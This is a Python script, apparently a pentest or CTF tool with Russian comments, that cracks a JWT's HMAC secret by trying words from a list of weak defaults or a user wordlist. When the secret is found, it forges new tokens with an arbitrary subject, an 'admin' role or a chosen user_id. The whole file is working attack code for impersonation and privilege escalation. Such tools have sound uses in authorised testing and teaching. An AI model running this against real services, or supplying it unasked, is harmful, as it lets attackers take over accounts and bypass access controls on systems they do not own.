#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
jwt_brute.py — подбор HMAC-секрета JWT по словарю.

  python jwt_brute.py "eyJ..." --wordlist words.txt
  python jwt_brute.py "eyJ..." --wordlist words.txt --forge-sub admin --role admin
  python jwt_brute.py "eyJ..." --algs HS256,HS384,HS512

Если секрет найден, печатает его и (опционально) новый токен.
"""
from __future__ import annotations

# Windows: консоль/pipe не должны падать на Unicode (—, →, «», █).
try:
    import sys as _sys
    for _stream in (_sys.stdout, _sys.stderr):
        _stream.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

import argparse
import base64
import hashlib
import hmac
import json

DEFAULT = ["secret", "password", "123456", "12345678", "key", "changeme",
           "admin", "jwt", "s3cr3t", "supersecret", "secretkey", "test"]


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_dec(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def sign(header: dict, payload: dict, secret: bytes, alg: str) -> str:
    h = b64url(json.dumps(header, separators=(",", ":")).encode())
    p = b64url(json.dumps(payload, separators=(",", ":")).encode())
    msg = f"{h}.{p}".encode()
    fn = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}[alg]
    return f"{h}.{p}.{b64url(hmac.new(secret, msg, fn).digest())}"


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("token")
    ap.add_argument("--wordlist")
    ap.add_argument("--algs", default="HS256,HS384,HS512")
    ap.add_argument("--forge-sub")
    ap.add_argument("--role")
    ap.add_argument("--user-id", type=int)
    args = ap.parse_args()

    parts = args.token.split(".")
    if len(parts) != 3:
        print("[-] это не JWT")
        return
    header = json.loads(b64url_dec(parts[0]))
    payload = json.loads(b64url_dec(parts[1]))
    print("[+] header:", header)
    print("[+] payload:", payload)

    words = DEFAULT
    if args.wordlist:
        words = [l.rstrip("\n") for l in open(args.wordlist, encoding="utf-8", errors="replace")
                 if l.strip()]
    print(f"[+] словарь: {len(words)}")

    found = None
    for alg in args.algs.split(","):
        alg = alg.strip()
        if alg not in ("HS256", "HS384", "HS512"):
            continue
        # проверяем по исходному header, чтобы не сломать порядок ключей
        for w in words:
            cand = sign(header, payload, w.encode(), alg)
            if hmac.compare_digest(cand, args.token):
                found = (alg, w)
                break
        if found:
            break

    if not found:
        print("[-] секрет не найден")
        return
    alg, secret = found
    print(f"[+] СЕКРЕТ: {secret!r} (alg={alg})")

    if args.forge_sub or args.role or args.user_id is not None:
        new = dict(payload)
        if args.forge_sub:
            new["sub"] = args.forge_sub
        if args.role:
            new["role"] = args.role
        if args.user_id is not None:
            new["user_id"] = args.user_id
        token = sign(header, new, secret.encode(), alg)
        print("[+] новый токен:", token)


if __name__ == "__main__":
    main()
